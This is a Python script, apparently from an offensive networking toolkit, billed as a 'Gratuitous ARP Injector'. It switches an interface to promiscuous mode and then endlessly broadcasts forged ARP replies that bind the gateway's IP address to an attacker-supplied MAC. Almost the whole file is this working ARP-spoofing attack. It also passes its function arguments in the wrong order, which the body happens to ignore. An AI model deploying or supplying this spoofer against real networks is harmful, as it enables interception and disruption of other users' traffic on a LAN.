#!/usr/bin/env python3

print (r"""
 ▄▄▄▄   ▓█████▄▄▄█████▓ ██▀███   ▄▄▄     ▓██   ██▓ ▄▄▄       ██▓    
▓█████▄ ▓█   ▀▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██  ██▒▒████▄    ▓██▒    
▒██▒ ▄██▒███  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄   ▒██ ██░▒██  ▀█▄  ▒██░    
▒██░█▀  ▒▓█  ▄░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██  ░ ▐██▓░░██▄▄▄▄██ ▒██░    
░▓█  ▀█▓░▒████▒ ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒ ░ ██▒▓░ ▓█   ▓██▒░██████▒
░▒▓███▀▒░░ ▒░ ░ ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░  ██▒▒▒  ▒▒   ▓▒█░░ ▒░▓  ░
▒░▒   ░  ░ ░  ░   ░      ░▒ ░ ▒░  ▒   ▒▒ ░▓██ ░▒░   ▒   ▒▒ ░░ ░ ▒  ░
 ░    ░    ░    ░        ░░   ░   ░   ▒   ▒ ▒ ░░    ░   ▒     ░ ░   
 ░         ░  ░           ░           ░  ░░ ░           ░  ░    ░  ░
      ░                                   ░ ░                                                                                                             
    """)

print ("Gratuitous ARP Injector")
print("Author: Magama Bazarov, @in9uz, <in9uz@protonmail.com>\n")

from scapy.all import *
from scapy.layers.l2 import *
import argparse
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

l2broad = "FF:FF:FF:FF:FF:FF"

def take_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--gateway", dest="gateway", type=str, required=True, help="Choose gateway IP address")
    parser.add_argument("--interface", dest="interface", type=str, required=True, help="Choose your interface for attack")
    parser.add_argument("--mac", dest="evilmac", type=str, required=True, help="Specify your MAC Address")
    args = parser.parse_args()

    return args

args = take_args()

def switch_to_promisc(interface):
    print(Fore.YELLOW + Style.BRIGHT + "\n[!] Switching " + Fore.BLUE + Style.BRIGHT + interface + Fore.YELLOW + Style.BRIGHT + " to promiscious mode")
    subprocess.call(["ip", "link", "set", interface, "promisc", "on"])
    ip_a_result = subprocess.check_output(["ip", "add", "show", interface])
    promisc_mode_search = re.search(r"PROMISC", ip_a_result.decode())
    if promisc_mode_search:
        print (Fore.YELLOW + Style.BRIGHT + "[*] Switched " + Fore.BLUE + Style.BRIGHT + "successfully")
    else:
        print (Fore.RED + Style.BRIGHT + "[!] Error. Not switched to promisc.")


def exploit(gateway, interface, evilmac):
    ether_frame = Ether(src=args.evilmac, dst=l2broad)
    arp_frame = ARP(op="is-at", pdst=args.gateway, hwsrc=args.evilmac, hwdst=l2broad, psrc=args.gateway)
    garp_frame = ether_frame / arp_frame
    sendp(garp_frame, iface=args.interface, inter=0.8, loop=1, verbose=1)

switch_to_promisc(args.interface)
exploit(args.interface, args.evilmac, args.gateway)



    




